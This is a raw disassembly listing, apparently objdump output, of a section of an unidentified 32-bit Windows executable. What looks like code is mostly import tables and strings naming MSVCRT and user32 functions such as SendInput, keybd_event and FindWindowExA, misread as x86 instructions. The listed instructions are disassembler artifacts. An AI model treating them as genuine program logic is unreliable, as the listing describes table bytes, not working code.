  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
